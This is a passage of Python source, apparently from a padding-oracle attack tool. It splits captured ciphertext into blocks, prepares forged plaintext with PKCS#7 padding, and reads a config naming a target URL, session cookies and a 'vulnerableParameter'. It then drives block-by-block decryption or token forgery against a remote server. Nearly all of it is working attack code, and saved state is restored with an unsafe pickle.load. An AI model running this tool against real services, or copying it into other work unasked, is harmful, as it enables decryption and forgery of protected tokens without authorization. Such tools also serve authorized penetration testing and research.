        bytemap = list(decoded_sourcestring)

        # Save the bytemap to the object in case operation is interupted
        self.bytemap = bytemap

        # initialize the blocks array
        self.blocks = []

        # we have to recreate the byte array, not just reference it
        actualBlocks = self.bytemap[:]

        # Get the block count and save it to the instance
        print(actualBlocks)
        print(int(len(actualBlocks)))
        self.blockCount = int((len(actualBlocks) / self.blocksize))

        # if the mode is 'firstblock' we need to remove the first block and assign it as the IV
        if self.ivMode == "firstblock":
            self.iv = actualBlocks[0 : self.blocksize]
            # push forward one block length
            actualBlocks = actualBlocks[self.blocksize :]
            self.blockCount = self.blockCount - 1

        # if the mode is unknown, we can just set the IV to zeros. The first block won't work, but everything else will.
        elif self.ivMode == "unknown":
            self.iv = [0] * self.blocksize

        # if the mode is knownIV, it is already set

        # Display the block count
        print(f"\n[+] (non-IV) Block Count: {self.blockCount}")

        if self.debug:
            print("\n[#]decimal representation of the decoded token value" + "\n")
            print("*************************************************")
            print(self.bytemap)
            print("*************************************************\n")

        # iterate through the block array and separate the blocks
        for x in range(0, self.blockCount):
            # take the next block off and add it to self.blocks
            self.blocks.append(actualBlocks[0 : self.blocksize])

            # push forward one block length
            actualBlocks = actualBlocks[self.blocksize :]

        if self.debug:
            print("*************************************************\n")
            print("\n[*]Initialization Vector (IV) value:")
            print(self.iv)
            print("*************************************************\n")

    def encryptInit(self):

        print(f"[+]Raw encrypt string: {self.sourceString}")
        print(f"[+]Plaintext encoding: {self.plaintextEncoding}")

        # unknown IV mode can't produce a clean first block
        if self.ivMode == "unknown":
            print(
                "[!]Encrypt with unknown IV is not supported. Use knownIV, firstblock, or anchorBlock mode."
            )
            sys.exit(2)

        if self.ivMode == "anchorBlock":
            # Extract the first block from the provided anchorCiphertext to use as the IV/anchor
            anchor_ct = self.anchorCiphertext
            unquoted = urllib.parse.unquote(anchor_ct)
            if (self.encodingMode == "base64") or (self.encodingMode == "base64Url"):
                unquoted += "=" * (len(unquoted) % 4)
            if self.encodingMode == "base64Url":
                unquoted = unquoted.replace("-", "+").replace("_", "/")
            if (self.encodingMode == "base64") or (self.encodingMode == "base64Url"):
                anchor_bytes = list(binascii.a2b_base64(unquoted))
            elif self.encodingMode == "hex":
                anchor_bytes = list(bytes.fromhex(unquoted))
            self.iv = anchor_bytes[0 : self.blocksize]
            print(f"[+]Anchor block extracted from ciphertext: {bytes(self.iv).hex()}")
            print(
                "[+]Your plaintext will be encrypted into blocks following this anchor."
            )

        if self.ivMode == "knownIV":
            print(f"[+]Using known IV: {self.iv}")
            print(
                "[!]Note: First decrypted block will be uncontrolled (server runs AES_DEC on C_0 with static IV)."
            )
            print(
                "[+]IV will be appended as anchor block. Your plaintext starts at block 1."
            )

        # Encode the plaintext string to bytes using the configured encoding
        raw_bytes = self.sourceString.encode(self.plaintextEncoding)
        print(f"[+]Encoded bytes ({len(raw_bytes)}): {raw_bytes.hex()}")

        # Apply PKCS#7 padding at the byte level
        padding_length = self.blocksize - (len(raw_bytes) % self.blocksize)
        if padding_length == 0:
            padding_length = self.blocksize
        padded_bytes = raw_bytes + bytes([padding_length] * padding_length)
        print(
            f"[+]Padded bytes ({len(padded_bytes)}), padding={padding_length}: {padded_bytes.hex()}"
        )

        # Save the bytemap to the object in case operation is interrupted
        self.bytemap = padded_bytes

        # initialize the blocks array
        self.blocks = []

        # we have to recreate the byte array, not just reference it
        actualBlocks = self.bytemap[:]

        # Get the block count and save it to the instance
        self.blockCount = int((len(self.bytemap) / self.blocksize))

        # iterate through the block array and separate the blocks
        for x in range(0, self.blockCount):
            # take the next block off and add it to self.blocks
            self.blocks.append(actualBlocks[0 : self.blocksize])

            # push forward one block length
            actualBlocks = actualBlocks[self.blocksize :]

        # Encryption works by starting at the last block and working backwards. Therefore, we will reverse the blocks.
        self.blocks = list(reversed(self.blocks))


async def async_main():
    # argparse setup
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-r", "--restore", type=str, help="Specify a state file to restore from"
    )
    parser.add_argument(
        "-i",
        "--input",
        type=str,
        help="Specify either the ciphertext (for decrypt) or plainttext (for encrypt)",
    )
    parser.add_argument("-m", "--mode", type=str, help="Select encrypt or decrypt mode")
    parser.add_argument(
        "-d", "--debug", action="store_true", help="increase output verbosity"
    )
    parser.add_argument(
        "-c", "--config", type=str, help="Specify the configuration file"
    )
    parser.add_argument(
        "-s",
        "--intermediates",
        type=str,
        help='Pre-seed solved intermediate values from a previous run. Format: "15:210,14:216"',
    )
    args = parser.parse_args()

    # check to see if we are performing a restore operation
    if args.restore:
        # if we are doing a restore, only -s (intermediates) is allowed alongside
        if args.input or args.mode or args.debug:
            handleError(
                "\n[x] In restore mode, only -s (intermediates) may be combined. Exiting."
            )

    # make sure that required parameters are present and validated
    else:
        if (not args.mode) or (not args.input) or (not args.config):
            handleError(
                "\n[x] Mode (-m), Config (-c), and input (-i) are required parameters. Exiting"
            )

        if (
            (args.mode != "encrypt")
            and (args.mode != "decrypt")
            and (args.mode != "d")
            and (args.mode != "e")
        ):
            handleError(
                "\n[x] Mode must be set to either 'encrypt' / 'decrypt' or e / d. Exiting."
            )
        else:
            if args.mode == "e":
                args.mode = "encrypt"
            if args.mode == "d":
                args.mode = "decrypt"

    # Proceed with resume function
    if args.restore:
        print(
            f"\n[!]RESTORE MODE INTIATED. Attempting to restart job from file {args.restore}"
        )

        pickleFile = open(args.restore, "rb")
        job = pickle.load(pickleFile)
        pickleFile.close()
        # Recreate the httpx client since it can't be pickled
        job.initialize_client()
        if not hasattr(job, "preseeded_intermediates"):
            job.preseeded_intermediates = {}
        if args.intermediates:
            for pair in args.intermediates.split(","):
                byte_pos, i_val = pair.strip().split(":")
                job.preseeded_intermediates[int(byte_pos)] = int(i_val)
            print(
                f"[+] Pre-seeded {len(job.preseeded_intermediates)} intermediate values: {job.preseeded_intermediates}"
            )
        print(job.name)
        print(job.solvedBlocks)
        print(job.currentBlock)
        job.printProgress()

    # Proceed with a new job
    else:
        # ensure the provided configuration file is actually there
        if not path.exists(args.config):
            handleError("[x]Cannot find configuration file at path: {}. Exiting")

        # config parser setup

        config = configparser.RawConfigParser()
        config.read(args.config)
        config.sections()

        name = config["default"]["name"]
        URL = config["default"]["URL"]
        httpMethod = config["default"]["httpMethod"]
        additionalParameters = json.loads(config["default"]["additionalParameters"])
        blocksize = config["default"]["blocksize"]
        httpProxyOn = config["default"].getboolean("httpProxyOn")
        httpProxyIp = config["default"]["httpProxyIp"]
        httpProxyPort = config["default"]["httpProxyPort"]
        headers = json.loads(config["default"]["headers"])
        cookies = json.loads(config["default"]["cookies"])
        ivMode = config["default"]["ivMode"]
        iv = json.loads(config["default"]["iv"])
        oracleMode = config["default"]["oracleMode"]
        oracleText = config["default"]["oracleText"]
        vulnerableParameter = config["default"]["vulnerableParameter"]
        inputMode = config["default"]["inputMode"]
        encodingMode = config["default"]["encodingMode"]
        postFormat = config["default"]["postFormat"]
        followRedirects = config["default"].getboolean("followRedirects")
        concurrency = int(config["default"].get("concurrency", "10"))
        redirectDelay = float(config["default"].get("redirectDelay", "0"))
        confirmations = int(config["default"].get("confirmations", "0"))
        plaintextEncoding = config["default"].get("plaintextEncoding", "utf-8")
        # config value validation
        # validate oracleMode
        if not oracleMode:
            handleError("[x]CONFIG ERROR: oracleMode required")

        else:
            if (oracleMode != "search") and (oracleMode != "negative"):
                handleError("[x]CONFIG ERROR: invalid oracleMode")

        # validate encodingMode
        if not encodingMode:
            handleError("[x]CONFIG ERROR: encodingMode required")

        else:
            validEncodingModes = ["base64", "base64Url", "hex"]
            if encodingMode not in validEncodingModes:
                handleError("[x]CONFIG ERROR: invalid encodingMode")

        # Validate HTTP Method
        if (httpMethod != "GET") and (httpMethod != "POST"):
            handleError(
                "[x]CONFIG ERROR: httpMethod not valid. Must be 'GET' or 'POST'"
            )

        # Validate POST format
        if httpMethod == "POST":
            if postFormat == "form-urlencoded":
                pass

            elif postFormat == "multipart":
                pass

            elif postFormat == "json":
                pass
            else:
                handleError(
                    "[x]CONFIG ERROR: When httpMethod is POST postFormat must be 'form-urlencoded', 'multipart', or 'json'"
                )
        # validate proxy IP
        if httpProxyIp:
            try:
                socket.inet_aton(httpProxyIp)
            except socket.error:
                handleError("[x]CONFIG ERROR: proxy ip is not a valid IP address.")

        # validate proxy port
        if httpProxyPort:
            try:
                httpProxyPort = int(httpProxyPort)
            except Exception:
                handleError("[x]CONFIG ERROR: proxy port is not valid INT")

            if not (httpProxyPort <= 65535):
                handleError("[x]CONFIG ERROR: proxy port is not a valid port number")

        # validate block size
        try:
            blocksize = int(blocksize)
        except Exception:
            handleError("[x]CONFIG ERROR: blocksize must be INT.")

        if not validators.url(URL):
            handleError("[x]CONFIG ERROR: URL is not valid.")

        # validate ivMode
        if not ivMode:
            handleError("[x]CONFIG ERROR: ivMode is required.")
        else:
            if ivMode not in ("firstblock", "knownIV", "unknown", "anchorBlock"):
                print(f"[x]CONFIG ERROR: iVMode: '{ivMode}' invalid.")
                handleError(
                    "[!]Valid ivMode values: firstblock, knownIV, unknown, or anchorBlock"
                )

        # validate iv

        # iv required if in knownIV mode
        if ivMode == "knownIV":
            if not iv:
                handleError("[x]CONFIG ERROR: iv is required when in IV mode")

            if len(iv) != blocksize:
                handleError("[x]CONFIG ERROR: iv must be the same length as blocksize")

            if not (all(isinstance(x, int) for x in iv)):
                handleError(
                    "[x]CONFIG ERROR: IV is not properly formatted. Not all values are type INT"
                )

        # anchorBlock mode requires anchorCiphertext
        anchorCiphertext = config["default"].get("anchorCiphertext", "")
        if ivMode == "anchorBlock":
            if not anchorCiphertext:
                handleError(
                    "[x]CONFIG ERROR: anchorCiphertext is required when ivMode is anchorBlock"
                )

        # Initialize Job object
        job = Job(
            blocksize,
            args.mode,
            args.debug,
            args.input,
            name,
            ivMode,
            URL,
            httpMethod,
            additionalParameters,
            httpProxyOn,
            httpProxyIp,
            httpProxyPort,
            headers,
            iv,
            oracleMode,
            oracleText,
            vulnerableParameter,
            inputMode,
            cookies,
            encodingMode,
            postFormat,
            followRedirects,
            concurrency,
            redirectDelay,
            confirmations,
            plaintextEncoding,
            anchorCiphertext,
        )
        job.initialize()

        # Parse and set pre-seeded intermediates if provided
        if args.intermediates:
            for pair in args.intermediates.split(","):
                byte_pos, i_val = pair.strip().split(":")
                job.preseeded_intermediates[int(byte_pos)] = int(i_val)
            print(
                f"[+] Pre-seeded {len(job.preseeded_intermediates)} intermediate values: {job.preseeded_intermediates}"
            )

    input_display = args.input if args.input else job.sourceString
    print(
        f"Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {input_display}"
    )
    writeToLog(
        f"Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {input_display}"
    )

    max_block_retries = 3
    block_failures = 0
    while job.currentBlock < (job.blockCount):
        result = await job.nextBlock()
        if result == 0:
            block_failures = 0

            # Since the block was sucessful, roll to the next one
            job.currentBlock = job.currentBlock + 1

            # Clear byte-level progress and pre-seeded intermediates since they're block-specific
            job._clear_byte_progress()
            job.preseeded_intermediates = {}

            # Save the current state so that it can be resumed later
            saveState(job)

            # Print the current progress so far
            job.printProgress()

        else:
            block_failures += 1
            if block_failures >= max_block_retries:
                print(
                    f"[x] Block {job.currentBlock} failed {max_block_retries} times in a row. Aborting."
                )
                print("[!] Check your session cookies / authentication and try again.")
                saveState(job)
                sys.exit(1)
            # Keep byte-level progress so the retry resumes where it left off
            print(
                f"[!]Something went wrong with block {job.currentBlock}. Retrying ({block_failures}/{max_block_retries})"
            )
            if job.block_solved_intermediates:
                print(
                    f"[+] Resuming with {len(job.block_solved_intermediates)} bytes already solved"
                )

    print("[!]All blocks completed")

    # if we just completed an encrypt operation, we need to reverse the order, join the pieces, and base64
    if job.mode == "encrypt":
        for xxx in range(0, len(job.solvedBlocks.values())):
            # combine all of the blocks into one decimal list
            joinedCrypto = b"".join(reversed(list(job.solvedBlocks.values())))

            # joinedCrypto = b''.join(list(job.solvedBlocks.values()))
            joinedCrypto = joinedCrypto[(-1 - xxx) * 16 :]

            # Append the anchor block used as previousBlock for block 0.
            if job.ivMode in ("knownIV", "anchorBlock"):
                joinedCrypto = b"".join([joinedCrypto, bytes(job.iv)])
            else:
                joinedCrypto = b"".join([joinedCrypto, bytes([0] * job.blocksize)])

        encryptFinal = job.encodeToken(joinedCrypto)

        print(f"[!]Encrypt final result: {encryptFinal}")

    # All blocks completed

    # Save final state
    # saveState(job)

    if job.mode == "decrypt":
        combined = b"".join(
            job.solvedBlocks[i] for i in sorted(job.solvedBlocks.keys())
        )
        # Strip PKCS#7 padding
        pad_len = combined[-1]
        if (
            1 <= pad_len <= job.blocksize
            and combined[-pad_len:] == bytes([pad_len]) * pad_len
        ):
            stripped = combined[:-pad_len]
        else:
            stripped = combined
        try:
            plaintext = stripped.decode(job.plaintextEncoding)
        except Exception:
            plaintext = stripped.decode("latin1")
        print(f"\n{'=' * 50}")
        print(f"[+] Decrypted plaintext: {plaintext}")
        print(f"{'=' * 50}")

    # job.printProgress()


def main():
    asyncio.run(async_main())


if __name__ == "__main__":
    main()
